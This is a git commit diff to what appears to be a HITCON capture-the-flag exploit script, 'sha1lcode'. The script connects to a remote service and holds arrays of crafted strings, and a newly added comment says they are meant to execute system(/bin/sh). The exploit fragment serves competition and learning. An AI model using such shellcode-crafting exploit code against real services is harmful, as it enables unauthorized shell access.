4fd77c5b07181b5659934ae565ba368d3296e71d
Leo.C <evilleoc@gmail.com>
2014-08-19 10:52:37 +0800

    hitcon sha1lcode by cho

--- Hitcon/sha1lcode/sha1lcode_by_cho.py
+++ Hitcon/sha1lcode/sha1lcode_by_cho.py
@@ -8,6 +8,7 @@ port = 5566
 
 io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))
 
+# syscall system(/bin/sh)
 ary = ['AAAAAAAAAAA#:7[F', "AAAAAAAAAAA%J'ic", "AAAAAAAAAAA#L;4t", "AAAAAAAAAAA!x&J`", "AAAAAAAAAAA!d?O9", 'AAAAAAAAAAA#L;4t']
 ary+= ['AAAAAAAAAAA*A$D;', 'AAAAAAAAAAA$fF6)', "AAAAAAAAAAA#L;4t", "AAAAAAAAAAA!x&J`", "AAAAAAAAAAA$b(%T", 'AAAAAAAAAAA#L;4t']
 ary+= ['AAAAAAAAAAA)r,BN', 'AAAAAAAAAAA!P|p;', 'AAAAAAAAAAA+dajd', 'AAAAAAAAAAA!"1lz', 'AAAAAAAAAAA!D(*5']
